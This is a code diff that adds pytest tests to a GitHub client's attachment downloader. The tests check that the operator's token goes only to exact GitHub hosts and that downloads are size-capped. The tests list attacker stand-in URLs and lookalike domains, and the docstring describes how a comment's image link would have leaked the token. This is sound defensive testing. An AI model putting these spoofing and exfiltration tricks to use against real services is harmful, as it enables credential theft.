@@ -445,6 +445,70 @@ def test_download_url_writes_body_to_dest(tmp_path, monkeypatch):
     assert captured["headers"]["Authorization"] == "Bearer secret"
 
 
+def test_attachment_token_never_leaves_github(tmp_path, monkeypatch):
+    """The operator's token must not ride a URL an ingress body chose.
+
+    ``extract_image_urls`` regex-matches *any* ``https?://`` link in a
+    comment body, so the host is attacker-supplied. Before this guard,
+    ``![](https://attacker.test/x.png)`` in any comment that cleared the
+    #408 authorization gate served the operator's GitHub token to
+    ``attacker.test`` on hop 1 — no agent, no prompt injection, no
+    container involved.
+
+    The fetch itself is still made: a genuinely public image stays
+    usable. Only the credential stops travelling.
+    """
+    seen: list[dict] = []
+
+    def fake_get(url, **kwargs):
+        seen.append({"url": url, "headers": kwargs["headers"]})
+        return _FakeStreamResponse(200, [b"x"])
+
+    monkeypatch.setattr(client._SESSION, "get", fake_get)
+
+    hostile = [
+        "https://attacker.test/x.png",
+        "http://127.0.0.1:9000/x.png",
+        # Suffix-matching would pass both of these. It must not be used.
+        "https://attacker-github.com/x.png",
+        "https://github.com.evil.test/x.png",
+        "https://notgithubusercontent.com/x.png",
+    ]
+    for i, url in enumerate(hostile):
+        assert client._download_url("secret", url, tmp_path / f"h{i}") is True
+        assert "Authorization" not in seen[-1]["headers"], url
+
+    allowed = [
+        "https://github.com/user-attachments/assets/abc",
+        "https://objects.githubusercontent.com/abc",
+        "https://raw.githubusercontent.com/o/r/main/a.png",
+        # A trailing-dot FQDN is the same host to every resolver.
+        "https://github.com./user-attachments/assets/abc",
+    ]
+    for i, url in enumerate(allowed):
+        assert client._download_url("secret", url, tmp_path / f"a{i}") is True
+        assert seen[-1]["headers"]["Authorization"] == "Bearer secret", url
+
+
+def test_attachment_download_is_capped(tmp_path, monkeypatch):
+    """An unbounded attachment fetch is a disk-fill anyone can trigger.
+
+    The telegram and cloud gates both cap; this one did not. A partial
+    file is refused outright rather than kept — a truncated image that
+    looks like a successful download is worse than a failed one.
+    """
+    over = client._MAX_ATTACHMENT_BYTES + 1
+    monkeypatch.setattr(
+        client._SESSION,
+        "get",
+        lambda url, **kwargs: _FakeStreamResponse(200, [b"\0" * over]),
+    )
+    dest = tmp_path / "huge.png"
+
+    assert client._download_url("secret", "https://github.com/a", dest) is False
+    assert not dest.exists()
+
+
 def test_download_url_returns_false_on_non_2xx(tmp_path, monkeypatch):
     monkeypatch.setattr(
         client._SESSION, "get", lambda url, **kwargs: _FakeStreamResponse(404, []),
